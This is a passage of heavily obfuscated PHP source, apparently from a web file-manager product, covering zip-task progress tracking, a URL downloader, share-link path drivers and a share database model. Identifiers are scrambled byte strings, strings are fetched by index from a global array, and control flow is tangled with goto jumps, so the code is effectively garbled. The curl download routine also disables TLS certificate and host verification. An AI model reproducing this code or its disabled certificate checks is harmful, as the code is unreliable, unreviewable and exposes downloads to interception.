(strstr($e¬†¿Ûİ¶, $dÌÔª¿ÛÅ[92])) { $B©Şƒœ¦á[$dÌÔª¿ÛÅ[1289]] += 1; $B©Şƒœ¦á[$dÌÔª¿ÛÅ[1284]] += 1; } $B©Şƒœ¦á[$dÌÔª¿ÛÅ[1384]] = $eë˜¦¦é•­; goto dÍˆåßò­; D‡‰‹†¥äâ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $D†ßá¯¿ñ =& $_SERVER[÷ÖêïÔÔÓ]; parent::startAfter(); Hook::bind($D†ßá¯¿ñ[1412], array($this, $D†ßá¯¿ñ[1407])); $CÃ¡°ĞÖù =& $this->task; $CÃ¡°ĞÖù[$D†ßá¯¿ñ[1409]] = $D†ßá¯¿ñ[1014]; if (!$CÃ¡°ĞÖù[$D†ßá¯¿ñ[1237]]) { $CÃ¡°ĞÖù[$D†ßá¯¿ñ[1237]] = LNG($D†ßá¯¿ñ[1413]); } } protected function endAfter() { $cÛÔŒ¾Õ…Í =& $_SERVER[÷ÖêïÔÔÓ]; parent::endAfter(); Hook::unbind($cÛÔŒ¾Õ…Í[1412], array($this, $cÛÔŒ¾Õ…Í[1407])); } public function updateAfter() { $f²™øãˆÇÇ =& $_SERVER[÷ÖêïÔÔÓ]; $A½åáÊš®¡ =& $this->task; if (!$A½åáÊš®¡[$f²™øãˆÇÇ[1284]] || !$A½åáÊš®¡[$f²™øãˆÇÇ[684]]) { return; } if ($A½åáÊš®¡[$f²™øãˆÇÇ[1409]] == $f²™øãˆÇÇ[1014]) { $bº­ß™¸” = $A½åáÊš®¡[$f²™øãˆÇÇ[1387]]; if ($A½åáÊš®¡[$f²™øãˆÇÇ[1388]] != $f²™øãˆÇÇ[1014]) { $bº­ß™¸” = 0; } $Eñ˜©·Æ­Ì = ($A½åáÊš®¡[$f²™øãˆÇÇ[1391]] + $bº­ß™¸”) / $A½åáÊš®¡[$f²™øãˆÇÇ[684]]; $A½åáÊš®¡[$f²™øãˆÇÇ[1342]] = $Eñ˜©·Æ­Ì * 0.3; } else { if ($A½åáÊš®¡[$f²™øãˆÇÇ[1409]] == $f²™øãˆÇÇ[298]) { $Eñ˜©·Æ­Ì = $A½åáÊš®¡[$f²™øãˆÇÇ[1289]] / $A½åáÊš®¡[$f²™øãˆÇÇ[1284]]; $A½åáÊš®¡[$f²™øãˆÇÇ[1342]] = 0.3 + $Eñ˜©·Æ­Ì * 0.5; } else { if ($A½åáÊš®¡[$f²™øãˆÇÇ[1409]] == $f²™øãˆÇÇ[90]) { $Eñ˜©·Æ­Ì = 0; if ($A½åáÊš®¡[$f²™øãˆÇÇ[1386]]) { $Eñ˜©·Æ­Ì = $A½åáÊš®¡[$f²™øãˆÇÇ[1387]] / $A½åáÊš®¡[$f²™øãˆÇÇ[1386]]; } $A½åáÊš®¡[$f²™øãˆÇÇ[1342]] = 0.3 + 0.5 + $Eñ˜©·Æ­Ì * 0.2; } } } if ($A½åáÊš®¡[$f²™øãˆÇÇ[1342]] > 0) { $fïèÛäïÕß = timeFloat() - $A½åáÊš®¡[$f²™øãˆÇÇ[1344]] - $A½åáÊš®¡[$f²™øãˆÇÇ[1347]]; $A½åáÊš®¡[$f²™øãˆÇÇ[1348]] = $fïèÛäïÕß * (1 - $A½åáÊš®¡[$f²™øãˆÇÇ[1342]]) / $A½åáÊš®¡[$f²™øãˆÇÇ[1342]]; } } public function copyFileStart($dæ”ˆ×ÑĞ®, $Cö±Ø‘ö†‡, $BÒî„¿—äÈ, $a£èŠ‰ºé, $CÍïÜ§ŞÙ, $fï‹ë¼óåØ) { $bĞ¶áĞğ• =& $_SERVER[÷ÖêïÔÔÓ]; parent::copyFileStart($dæ”ˆ×ÑĞ®, $Cö±Ø‘ö†‡, $BÒî„¿—äÈ, $a£èŠ‰ºé, $CÍïÜ§ŞÙ, $fï‹ë¼óåØ); $b¬§Å‹à×¸ =& $this->task; if ($b¬§Å‹à×¸[$bĞ¶áĞğ•[1409]] == $bĞ¶áĞğ•[298]) { $b¬§Å‹à×¸[$bĞ¶áĞğ•[1409]] = $bĞ¶áĞğ•[90]; } $this->update(); } public function copyFileEnd($f¼šùĞÁÈ‹, $D–»Ù½³ë†, $cÉ·‚ƒíÜ, $f¤œšâ…© , $Fàƒ¤ Ï’®, $aÇ¸ƒ“î³ô) { $C–Í±Ó•ªÌ =& $_SERVER[÷ÖêïÔÔÓ]; $DÓ‹”äÛš =& $this->task; $DÓ‹”äÛš[$C–Í±Ó•ªÌ[1387]] = $DÓ‹”äÛš[$C–Í±Ó•ªÌ[1386]]; $DÓ‹”äÛš[$C–Í±Ó•ªÌ[1391]] += $DÓ‹”äÛš[$C–Í±Ó•ªÌ[1386]]; $DÓ‹”äÛš[$C–Í±Ó•ªÌ[1388]] = $C–Í±Ó•ªÌ[33]; $this->update(); } public function nameParse($b¤µ‚é½§) { $dÕ¬ŞØÍÒ =& $_SERVER[÷ÖêïÔÔÓ]; $A¶ÒÀÀ° =& $this->task; if ($A¶ÒÀÀ°[$dÕ¬ŞØÍÒ[1289]] < $A¶ÒÀÀ°[$dÕ¬ŞØÍÒ[1284]]) { $cÕåè¬®µÂ = get_path_this($b¤µ‚é½§); if (strstr($cÕåè¬®µÂ, $dÕ¬ŞØÍÒ[92])) { $A¶ÒÀÀ°[$dÕ¬ŞØÍÒ[1289]] += 1; } } if ($A¶ÒÀÀ°[$dÕ¬ŞØÍÒ[1409]] == $dÕ¬ŞØÍÒ[1014]) { $A¶ÒÀÀ°[$dÕ¬ŞØÍÒ[1409]] = $dÕ¬ŞØÍÒ[298]; } $A¶ÒÀÀ°[$dÕ¬ŞØÍÒ[1384]] = $b¤µ‚é½§; $this->update(); } } class Downloader { static function start($D­´ŞÁôÃÛ, $D‹Ñùìïô°, $eáŒ¶‰ëîõ = 10) { goto Cˆ•ÖÇ·Ô”; DÛ¸Ÿ‘¼: if ($EÓµ¥Ğ¢Á®[$eùºòİÂìš[1006]]) { @unlink($b÷ßİ¤½Ğ); } return $EÓµ¥Ğ¢Á®; goto dïôÂ¡¸×; E…İğÒÎ‘À: $Bù¾îŠïà„ = $D‹Ñùìïô° . $eùºòİÂìš[1415]; if (is_array($D­´ŞÁôÃÛ)) { $c’ô…×ˆá† = $D­´ŞÁôÃÛ; } else { $c’ô…×ˆá† = url_header($D­´ŞÁôÃÛ); } $D­´ŞÁôÃÛ = $c’ô…×ˆá†[$eùºòİÂìš[292]]; goto a„®ï‘Ìì; D××´Ğ¾÷Š: if (is_file($b÷ßİ¤½Ğ)) { $c±ğê¥åå¥ = file_get_contents($b÷ßİ¤½Ğ); $aÊÇÏ¡ä¬ = json_decode($c±ğê¥åå¥, 1); } if (file_exists($D‹Ñùìïô°) && $Eå…Œ¢ÂÒİ == filesize($D‹Ñùìïô°)) { @unlink($Bù¾îŠïà„); @unlink($b÷ßİ¤½Ğ); return array($eùºòİÂìš[1006] => !0, $eùºòİÂìš[1008] => $eùºòİÂìš[1417]); } if ($aÊÇÏ¡ä¬[$eùºòİÂìš[322]] != $Eå…Œ¢ÂÒİ) { $aÊÇÏ¡ä¬ = array($eùºòİÂìš[322] => $Eå…Œ¢ÂÒİ); } goto aáˆÔßÇ»°; aáˆÔßÇ»°: if ($cˆ‡ÛÌÏá > $Eå…Œ¢ÂÒİ) { @unlink($Bù¾îŠïà„); } file_put_contents($b÷ßİ¤½Ğ, json_encode($aÊÇÏ¡ä¬)); $EÓµ¥Ğ¢Á® = self::fileDownloadCurl($D­´ŞÁôÃÛ, $D‹Ñùìïô°, !0, $cˆ‡ÛÌÏá, $Eå…Œ¢ÂÒİ); goto DÛ¸Ÿ‘¼; føˆœêŞÏ: $Eå…Œ¢ÂÒİ = intval($c’ô…×ˆá†[$eùºòİÂìš[322]]); if (file_exists($Bù¾îŠïà„) && time() - filemtime($Bù¾îŠïà„) < 3) { return array($eùºòİÂìš[1006] => !1, $eùºòİÂìš[1008] => $eùºòİÂìš[1416]); } $aÊÇÏ¡ä¬ = array(); goto D××´Ğ¾÷Š; a„®ï‘Ìì: if (!$D­´ŞÁôÃÛ) { return array($eùºòİÂìš[1006] => !1, $eùºòİÂìš[1008] => $eùºòİÂìš[1011]); } if (!$c’ô…×ˆá†[$eùºòİÂìš[1200]] || $c’ô…×ˆá†[$eùºòİÂìš[322]] == 0) { @unlink($Bù¾îŠïà„); @unlink($D‹Ñùìïô°); $EÓµ¥Ğ¢Á® = self::fileDownloadFopen($D­´ŞÁôÃÛ, $D‹Ñùìïô°, $c’ô…×ˆá†[$eùºòİÂìš[322]]); if ($EÓµ¥Ğ¢Á®[$eùºòİÂìš[1006]]) { return $EÓµ¥Ğ¢Á®; } else { @unlink($Bù¾îŠïà„); @unlink($D‹Ñùìïô°); $EÓµ¥Ğ¢Á® = self::fileDownloadCurl($D­´ŞÁôÃÛ, $D‹Ñùìïô°, !1, 0, $c’ô…×ˆá†[$eùºòİÂìš[322]]); @unlink($Bù¾îŠïà„); return $EÓµ¥Ğ¢Á®; } } $cˆ‡ÛÌÏá = is_file($Bù¾îŠïà„) ? filesize($Bù¾îŠïà„) : 0; goto føˆœêŞÏ; Cˆ•ÖÇ·Ô”: $eùºòİÂìš =& $_SERVER[÷ÖêïÔÔÓ]; if (!request_url_safe($D­´ŞÁôÃÛ)) { return array($eùºòİÂìš[1006] => !1, $eùºòİÂìš[1008] => $eùºòİÂìš[1011]); } $b÷ßİ¤½Ğ = $D‹Ñùìïô° . $eùºòİÂìš[1414]; goto E…İğÒÎ‘À; dïôÂ¡¸×: } static function fileDownloadFopen($a„óßª÷ß¯, $BÌÉÔ˜¶ªö, $dô²Ôñğ•— = 0) { $c§·Æ˜›à =& $_SERVER[÷ÖêïÔÔÓ]; @ini_set($c§·Æ˜›à[1418], $c§·Æ˜›à[1419]); $C½ñÑƒÌ”Û = $BÌÉÔ˜¶ªö . $c§·Æ˜›à[1415]; set_timeout(); @unlink($C½ñÑƒÌ”Û); if ($Aİò¯ë—Ø’ = @fopen($a„óßª÷ß¯, $c§·Æ˜›à[1420])) { goto c½¡Éâ†½Ş; Bº‘ÄÁ›È©: self::checkGzip($C½ñÑƒÌ”Û); if (!@rename($C½ñÑƒÌ”Û, $BÌÉÔ˜¶ªö)) { usleep(round(rand(0, 1000) * 50)); @unlink($BÌÉÔ˜¶ªö); $FßŠäçâÈ = @rename($C½ñÑƒÌ”Û, $BÌÉÔ˜¶ªö); if (!$FßŠäçâÈ) { return array($c§·Æ˜›à[1006] => !1, $c§·Æ˜›à[1008] => $c§·Æ˜›à[1425]); } } return array($c§·Æ˜›à[1006] => !0, $c§·Æ˜›à[1008] => $c§·Æ˜›à[682]); goto c‚áÆ“éì†; c½¡Éâ†½Ş: if (!($DŞ—­¨À‹Ø = @fopen($C½ñÑƒÌ”Û, $c§·Æ˜›à[1421]))) { return array($c§·Æ˜›à[1006] => !1, $c§·Æ˜›à[1008] => $c§·Æ˜›à[1422]); } while (!feof($Aİò¯ë—Ø’)) { if (!file_exists($C½ñÑƒÌ”Û)) { fclose($DŞ—­¨À‹Ø); return array($c§·Æ˜›à[1006] => !1, $c§·Æ˜›à[1008] => $c§·Æ˜›à[1423]); } clearstatcache(); if ($dô²Ôñğ•— > 0 && $dô²Ôñğ•— == filesize(iconv_system($C½ñÑƒÌ”Û))) { break; } fwrite($DŞ—­¨À‹Ø, fread($Aİò¯ë—Ø’, 1024 * 8), 1024 * 8); } fclose($DŞ—­¨À‹Ø); goto B†¥ğä›íœ; B†¥ğä›íœ: fclose($Aİò¯ë—Ø’); $D®»éİ»Ü‘ = filesize(iconv_system($C½ñÑƒÌ”Û)); if ($dô²Ôñğ•— != 0 && $D®»éİ»Ü‘ != $dô²Ôñğ•—) { return array($c§·Æ˜›à[1006] => !1, $c§·Æ˜›à[1008] => $c§·Æ˜›à[1424]); } goto Bº‘ÄÁ›È©; c‚áÆ“éì†: } else { return array($c§·Æ˜›à[1006] => !1, $c§·Æ˜›à[1008] => $c§·Æ˜›à[1426]); } } static function fileDownloadCurl($c‡‘„Í™¶­, $dËÚİ¦—Ş, $aà÷Š¯­áõ = false, $bÑàÚ‚¯™‘ = 0, $D‹áŠ‰¦¥ê = 0) { goto a’ºÆßïÍ¸; a’ºÆßïÍ¸: $B‡°ÉƒÛíù =& $_SERVER[÷ÖêïÔÔÓ]; $bá¢àÌ¬«¬ = $dËÚİ¦—Ş . $B‡°ÉƒÛíù[1415]; set_timeout(); goto dÑÁÂ¾Ğ„•; eˆ‚¢òÅ§: curl_setopt($B•§šÖ‰ªõ, CURLOPT_USERAGENT, $B‡°ÉƒÛíù[1419]); $F¡À…ºšÍ = curl_exec($B•§šÖ‰ªõ); curl_progress_end($B•§šÖ‰ªõ); goto cÀÍ‘ İÚ; cÀÍ‘ İÚ: curl_close($B•§šÖ‰ªõ); fclose($Fê¸ÊºŠî); $A†ç‡â—Âà = filesize(iconv_system($bá¢àÌ¬«¬)); goto c”ÌÕØŞ‚È; DõÅò–ïºœ: return array($B‡°ÉƒÛíù[1006] => !1, $B‡°ÉƒÛíù[1008] => $B‡°ÉƒÛíù[1429]); goto a©™éÅ—Ò; cß‰Úä£Ò“: curl_setopt($B•§šÖ‰ªõ, CURLOPT_NOPROGRESS, !1); curl_setopt($B•§šÖ‰ªõ, CURLOPT_PROGRESSFUNCTION, $B‡°ÉƒÛíù[1188]); curl_progress_start($B•§šÖ‰ªõ); goto eˆ‚¢òÅ§; dÑÁÂ¾Ğ„•: $Fê¸ÊºŠî = @fopen($bá¢àÌ¬«¬, $B‡°ÉƒÛíù[706]); if (!$Fê¸ÊºŠî) { return array($B‡°ÉƒÛíù[1006] => !1, $B‡°ÉƒÛíù[1008] => $B‡°ÉƒÛíù[1427]); } $B•§šÖ‰ªõ = curl_init($c‡‘„Í™¶­); goto EÉ…ô×Ëö; cºä¶Ê‰ÕŸ: curl_setopt($B•§šÖ‰ªõ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($B•§šÖ‰ªõ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($B•§šÖ‰ªõ, CURLOPT_SSL_VERIFYHOST, 0); goto cß‰Úä£Ò“; c”ÌÕØŞ‚È: if ($A†ç‡â—Âà < $D‹áŠ‰¦¥ê && $D‹áŠ‰¦¥ê != 0) { return array($B‡°ÉƒÛíù[1006] => !1, $B‡°ÉƒÛíù[1008] => $B‡°ÉƒÛíù[1416]); } if ($A†ç‡â—Âà > $D‹áŠ‰¦¥ê && $D‹áŠ‰¦¥ê != 0) { return array($B‡°ÉƒÛíù[1006] => !1, $B‡°ÉƒÛíù[1008] => $B‡°ÉƒÛíù[1424]); } if ($F¡À…ºšÍ && filesize($bá¢àÌ¬«¬) != 0) { self::checkGzip($bá¢àÌ¬«¬); if (!@rename($bá¢àÌ¬«¬, $dËÚİ¦—Ş)) { @unlink($dËÚİ¦—Ş); $F¡À…ºšÍ = @rename($bá¢àÌ¬«¬, $dËÚİ¦—Ş); if (!$F¡À…ºšÍ) { return array($B‡°ÉƒÛíù[1006] => !1, $B‡°ÉƒÛíù[1008] => $B‡°ÉƒÛíù[1428]); } } return array($B‡°ÉƒÛíù[1006] => !0, $B‡°ÉƒÛíù[1008] => $B‡°ÉƒÛíù[682]); } goto DõÅò–ïºœ; EÉ…ô×Ëö: if ($aà÷Š¯­áõ) { curl_setopt($B•§šÖ‰ªõ, CURLOPT_RANGE, $bÑàÚ‚¯™‘ . $B‡°ÉƒÛíù[699]); } curl_setopt($B•§šÖ‰ªõ, CURLOPT_FILE, $Fê¸ÊºŠî); curl_setopt($B•§šÖ‰ªõ, CURLOPT_REFERER, get_url_link($c‡‘„Í™¶­)); goto cºä¶Ê‰ÕŸ; a©™éÅ—Ò: } static function checkGzip($a¬¯Ş’¾õ) { goto cÓì™È‚ùË; cÓì™È‚ùË: $dÂËËÔø†‘ = $_SERVER[÷ÖêïÔÔÓ][1430]; $a×£…Ûš Ì = file_sub_str($a¬¯Ş’¾õ, 0, 2); if ($dÂËËÔø†‘ != $a×£…Ûš Ì) { return; } goto e‚‚å¼éŠ»; A­Î‘ƒ¯Äá: file_put_contents($a¬¯Ş’¾õ, $aÌºäÙå¸); goto eªÌñãˆ·; e‚‚å¼éŠ»: ob_start(); readgzfile($a¬¯Ş’¾õ); $aÌºäÙå¸ = ob_get_clean(); goto A­Î‘ƒ¯Äá; eªÌñãˆ·: } } goto e÷ÀêîÇ¥½; aâ¶ÉÇ˜ğ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($Bøé‰ŒÛæ) { $this->pathParse = $Bøé‰ŒÛæ; $this->model = Model($_SERVER[÷ÖêïÔÔÓ][1077]); } protected function infoParse($fó×°‰­‡±, $c…¬‰Å”Ù = false, $d„ÄÔš¼Ñ¶ = false) { $bùƒÁì‚²• =& $_SERVER[÷ÖêïÔÔÓ]; return Action($bùƒÁì‚²•[990])->sharePathInfo($this->pathParse[$bùƒÁì‚²•[76]], !0); } public function listAll($Bº…Ñß¸Ç) { $c¹îÒ«Ôä =& $_SERVER[÷ÖêïÔÔÓ]; $bğ½ÌÑÇÅ = IO::info($this->pathParse[$c¹îÒ«Ôä[76]]); if (!$bğ½ÌÑÇÅ) { return array(); } $cºƒÅãÍé = $this->model->listAll($Bº…Ñß¸Ç); foreach ($cºƒÅãÍé as &$a¼Ğ°¸ßÉŒ) { $a¼Ğ°¸ßÉŒ[$c¹îÒ«Ôä[388]] = Action($c¹îÒ«Ôä[990])->itemInfo($a¼Ğ°¸ßÉŒ[$c¹îÒ«Ôä[388]]); $CŒµ¤ƒ‡—  = substr($a¼Ğ°¸ßÉŒ[$c¹îÒ«Ôä[76]], strpos(ltrim($a¼Ğ°¸ßÉŒ[$c¹îÒ«Ôä[76]], $c¹îÒ«Ôä[8]), $c¹îÒ«Ôä[8]) + 1); $a¼Ğ°¸ßÉŒ[$c¹îÒ«Ôä[388]][$c¹îÒ«Ôä[76]] = $this->pathParse[$c¹îÒ«Ôä[985]] . $CŒµ¤ƒ‡— ; } return $cºƒÅãÍé; } } class PathDriverDriverShareItem { public function __construct($AÈâ‘•“Á) { $this->pathParse = $AÈâ‘•“Á; } public function __call($DÚ¡„ôÂ, $Càì½åÊö„) { $C¯ëÜÊÉß =& $_SERVER[÷ÖêïÔÔÓ]; if (method_exists($this, $DÚ¡„ôÂ)) { return; } $AâŠ¬æâÁí = call_user_func_array(array($C¯ëÜÊÉß[1084], $DÚ¡„ôÂ), $Càì½åÊö„); $FÆÒƒğœó… = array($C¯ëÜÊÉß[1085], $C¯ëÜÊÉß[1086], $C¯ëÜÊÉß[1087], $C¯ëÜÊÉß[1088], $C¯ëÜÊÉß[482], $C¯ëÜÊÉß[484], $C¯ëÜÊÉß[1089], $C¯ëÜÊÉß[90], $C¯ëÜÊÉß[1090], $C¯ëÜÊÉß[1091]); if (in_array($DÚ¡„ôÂ, $FÆÒƒğœó…)) { $AâŠ¬æâÁí = $this->getPathOuter($AâŠ¬æâÁí); } return $AâŠ¬æâÁí; } public function copy($b¤ô•åìè, $D‚—®¤¦‘Ø, $Bî›•ÊéÉ¯ = false) { return $this->copyMove($b¤ô•åìè, $D‚—®¤¦‘Ø, $Bî›•ÊéÉ¯, $_SERVER[÷ÖêïÔÔÓ][482]); } public function move($AÑÙ±Ÿ¢°, $e÷–ƒ±‰ä…, $F‹íô‘µÛ = false) { return $this->copyMove($AÑÙ±Ÿ¢°, $e÷–ƒ±‰ä…, $F‹íô‘µÛ, $_SERVER[÷ÖêïÔÔÓ][484]); } private function copyMove($dŒÉ‘Æ” , $F³§èĞæŠ³, $aĞ¿çğ‹ª, $fó¶°›¿‘Ş) { goto F’­¹‚…ØÏ; cŠ¬†ŠèÎ: if ($D ²Âô»Ä‚->pathParse[$d¸‘·…[970]]) { $F³§èĞæŠ³ = $D ²Âô»Ä‚->pathParse[$d¸‘·…[970]]; } else { $F³§èĞæŠ³ = $f©Ñô÷ôí; } $B„ç‘®»ŸÕ = IO::copyMove($dŒÉ‘Æ” , $F³§èĞæŠ³, $aĞ¿çğ‹ª, $fó¶°›¿‘Ş); $B„ç‘®»ŸÕ = $this->getPathOuter($B„ç‘®»ŸÕ); goto a¢Ìº’¡‚…; F’­¹‚…ØÏ: $d¸‘·… =& $_SERVER[÷ÖêïÔÔÓ]; $f©Ñô÷ôí = $F³§èĞæŠ³; $D ²Âô»Ä‚ = IO::driverMake($F³§èĞæŠ³); goto cŠ¬†ŠèÎ; a¢Ìº’¡‚…: return $B„ç‘®»ŸÕ; goto d—Ï¦÷¨»; d—Ï¦÷¨»: } public function pathFather($A£ğ…šÂ‘«) { return get_path_father($this->pathParse[$_SERVER[÷ÖêïÔÔÓ][76]]); } public function iconvSystem($AÁèåÈŠ†) { return $AÁèåÈŠ†; } protected function infoParse($EÉÏ³¶¨‘) { $CŒàÏŒ”ò =& $_SERVER[÷ÖêïÔÔÓ]; $e• Û’‰“³ = $this->pathParse[$CŒàÏŒ”ò[435]][$CŒàÏŒ”ò[991]] . $this->pathParse[$CŒàÏŒ”ò[984]]; $C”ùÛ©‡ = IO::info($e• Û’‰“³); $d®²ĞÛË·Ñ = $this->pathParse[$CŒàÏŒ”ò[435]]; return Action($CŒàÏŒ”ò[1083])->_shareItemeParse($C”ùÛ©‡, $d®²ĞÛË·Ñ); } public function listAll($a»¾Ì¡Øå³) { $A›ôÂ˜Õ =& $_SERVER[÷ÖêïÔÔÓ]; $C¦÷¦œ®õª = IO::listAll($a»¾Ì¡Øå³); $D´Ò×°…Œ‹ = $this->pathParse[$A›ôÂ˜Õ[435]]; foreach ($C¦÷¦œ®õª as &$c´ß×æÄ) { check_abort(); $c´ß×æÄ = array_merge(IO::info($c´ß×æÄ[$A›ôÂ˜Õ[76]]), $c´ß×æÄ); $c´ß×æÄ[$A›ôÂ˜Õ[388]] = Action($A›ôÂ˜Õ[1083])->_shareItemeParse($c´ß×æÄ, $D´Ò×°…Œ‹); } return $C¦÷¦œ®õª; } public function getPathOuter($f‘‰¿Š™ßİ) { goto bÌÌ†©‚ë™; c×ª‘Ô‘ : $cÑ…¾”ãÜï = KodIO::clear($f‘‰¿Š™ßİ); $Bà´¬¼¥‰Š = KodIO::clear($this->pathParse[$b°»ËÕÎºØ[435]][$b°»ËÕÎºØ[991]]); $e°à¤ÃÎ‚Î = substr($cÑ…¾”ãÜï, strlen($Bà´¬¼¥‰Š)); goto CÍ„ÃÅ·¦; bÌÌ†©‚ë™: $b°»ËÕÎºØ =& $_SERVER[÷ÖêïÔÔÓ]; $d½Û¡ÌÜâ¨ = KodIO::parse($f‘‰¿Š™ßİ); if ($d½Û¡ÌÜâ¨[$b°»ËÕÎºØ[29]] == KodIO::KOD_SHARE_ITEM) { return $d½Û¡ÌÜâ¨[$b°»ËÕÎºØ[76]]; } goto c×ª‘Ô‘ ; CÍ„ÃÅ·¦: if (substr($cÑ…¾”ãÜï, 0, strlen($Bà´¬¼¥‰Š)) != $Bà´¬¼¥‰Š) { return !1; } return $this->pathParse[$b°»ËÕÎºØ[985]] . $b°»ËÕÎºØ[8] . ltrim($e°à¤ÃÎ‚Î, $b°»ËÕÎºØ[8]); goto FÕÌ‡Ş‘Î£; FÕÌ‡Ş‘Î£: } public function getType() { $AËÃÂ‰óÉ =& $_SERVER[÷ÖêïÔÔÓ]; $E»é½Ş ç² = str_replace($AËÃÂ‰óÉ[72], $AËÃÂ‰óÉ[33], get_class($this)); return strtolower($E»é½Ş ç²); } public function isTypeObject($dî½Úê„»ò) { return IO::isTypeObject($dî½Úê„»ò); } public function info($D–ê˜ŠÉÉÑ) { return $this->infoParse($D–ê˜ŠÉÉÑ); } public function infoAuth($Dóí©¤›‰) { return $this->infoParse($Dóí©¤›‰); } public function infoWithChildren($AˆóĞ…µ) { return $this->infoParse($AˆóĞ…µ); } public function infoFull($EÉÓÅ³Ô˜â) { return $this->infoParse($EÉÓÅ³Ô˜â); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Dßçì³Í†) { $this->pathParse = $Dßçì³Í†; } protected function infoParse($B³–İ›Ûä‹) { $f‰â‘š••Ê =& $_SERVER[÷ÖêïÔÔÓ]; return Action($f‰â‘š••Ê[990])->sharePathInfo($this->pathParse[$f‰â‘š••Ê[76]], !0); } public function listAll($EÜõ‹œÄ®ø) { $fší„ÅÙ„ =& $_SERVER[÷ÖêïÔÔÓ]; $F‡ãµ³„Ë… = IO::listAll($EÜõ‹œÄ®ø); foreach ($F‡ãµ³„Ë… as &$Eİ¶¢ÄœÃ) { check_abort(); $Eİ¶¢ÄœÃ = array_merge(IO::info($Eİ¶¢ÄœÃ[$fší„ÅÙ„[76]]), $Eİ¶¢ÄœÃ); $Eİ¶¢ÄœÃ[$fší„ÅÙ„[388]] = Action($fší„ÅÙ„[990])->itemInfo($Eİ¶¢ÄœÃ); $F¨ë“ëçäÜ = substr($Eİ¶¢ÄœÃ[$fší„ÅÙ„[76]], strpos(ltrim($Eİ¶¢ÄœÃ[$fší„ÅÙ„[76]], $fší„ÅÙ„[8]), $fší„ÅÙ„[8]) + 1); $Eİ¶¢ÄœÃ[$fší„ÅÙ„[388]][$fší„ÅÙ„[76]] = $this->pathParse[$fší„ÅÙ„[985]] . $F¨ë“ëçäÜ; } return $F‡ãµ³„Ë…; } } goto Dë­¯Šù«; Bê® Å¸‰”: class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\146\x79\124\151\x6d\x65", "\164\151\155\145", "\151\156\163\145\x72\x74\54\x75\160\144\x61\x74\x65", "\x66\165\156\143\x74\x69\157\156"), array("\143\x72\x65\x61\x74\x65\x54\x69\155\x65", "\x74\x69\155\145", "\x69\x6e\163\145\162\x74", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\x6f\160\164\x69\157\156\163", '', "\x69\x6e\163\x65\x72\x74\x2c\x75\160\x64\x61\x74\145\54\163\x65\154\145\143\x74", "\152\163\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($C¤ˆš ¤Šô) { $C¤½ôÈº†â =& $_SERVER[÷ÖêïÔÔÓ]; $d¯‰Œ††“ = isset($C¤ˆš ¤Šô[0]) ? $C¤ˆš ¤Šô[0] : !1; return array($C¤½ôÈº†â[2112] => array(USER_ID, $C¤½ôÈº†â[2113]), $C¤½ôÈº†â[2074] => array($d¯‰Œ††“, $C¤½ôÈº†â[2114])); } protected function listSimple() { $A‚ëˆ· = array($_SERVER[÷ÖêïÔÔÓ][1341] => USER_ID); $Dì·¯™¡¸í = $this->field($this->fieldList)->where($A‚ëˆ·)->select(); return $Dì·¯™¡¸í ? $Dì·¯™¡¸í : array(); } protected function getInfo($A¸¯Ú­«¯í, $A¡Å»²¹¿ = false) { $a¬º —¦» =& $_SERVER[÷ÖêïÔÔÓ]; if ($A¡Å»²¹¿) { return $this->_getShareInfo(array($a¬º —¦»[437] => $A¸¯Ú­«¯í)); } $A’áÄ¶Ù‰« = $this->cacheFunctionGet($a¬º —¦»[2115], $A¸¯Ú­«¯í); return $A’áÄ¶Ù‰«; } public function getInfoByHash($f¬«š†Ë×É) { return $this->_getShareInfo(array($_SERVER[÷ÖêïÔÔÓ][439] => $f¬«š†Ë×É)); } public function getInfoByPath($aãÄÅ©Õ˜) { $CÁä…ÖŠµ =& $_SERVER[÷ÖêïÔÔÓ]; $c÷Úí²˜¶‚ = array($CÁä…ÖŠµ[1341] => USER_ID, $CÁä…ÖŠµ[366] => $aãÄÅ©Õ˜); return $this->_getShareInfo($c÷Úí²˜¶‚); } public function getInfoBySourcePath($bµÄâ à¶¥) { $f‡—”œŒº„ =& $_SERVER[÷ÖêïÔÔÓ]; $BÖÔ±×Ü›± = array($f‡—”œŒº„[1341] => USER_ID, $f‡—”œŒº„[991] => $bµÄâ à¶¥); return $this->_getShareInfo($BÖÔ±×Ü›±); } private function _getShareInfo($E­ÜÁº²œ×) { goto AƒŞ ¦÷; AƒŞ ¦÷: $EåÕÆôê½— =& $_SERVER[÷ÖêïÔÔÓ]; $BÅäøÏóÓÂ = $this->where($E­ÜÁº²œ×)->find(); if (!$BÅäøÏóÓÂ) { return !1; } goto aÆö°ÕÊù«; BôŞÒƒ¦‰¯: if ($BÅäøÏóÓÂ[$EåÕÆôê½—[366]] == $EåÕÆôê½—[464]) { $BÅäøÏóÓÂ[$EåÕÆôê½—[388]] = IO::info($BÅäøÏóÓÂ[$EåÕÆôê½—[991]]); } else { $BÅäøÏóÓÂ[$EåÕÆôê½—[388]] = Model($EåÕÆôê½—[1077])->pathInfo($BÅäøÏóÓÂ[$EåÕÆôê½—[366]]); } $BÅäøÏóÓÂ[$EåÕÆôê½—[2117]] = $FçëÑø; return $BÅäøÏóÓÂ; goto d¨›Ì¢‡·¹; aÆö°ÕÊù«: $E­ÜÁº²œ× = array($EåÕÆôê½—[437] => $BÅäøÏóÓÂ[$EåÕÆôê½—[437]]); $bƒòÓ«øà« = $EåÕÆôê½—[2116]; $FçëÑø = Model($EåÕÆôê½—[529])->order($EåÕÆôê½—[364])->field($bƒòÓ«øà«)->where($E­ÜÁº²œ×)->select(); goto BôŞÒƒ¦‰¯; d¨›Ì¢‡·¹: } protected function getInfoAuth($CË–…‰–Çğ) { $dÉ¶ª¬„¡ =& $_SERVER[÷ÖêïÔÔÓ]; $A¹ïÅÜ®«Ñ = $this->getInfo($CË–…‰–Çğ); $A¹ïÅÜ®«Ñ[$dÉ¶ª¬„¡[373]] = Model($dÉ¶ª¬„¡[450])->authMake($A¹ïÅÜ®«Ñ[$dÉ¶ª¬„¡[2117]]); return $A¹ïÅÜ®«Ñ; } protected function listData($Bêé‚äÛè‘ = null, $f–ªÏŒÔîê = 300) { 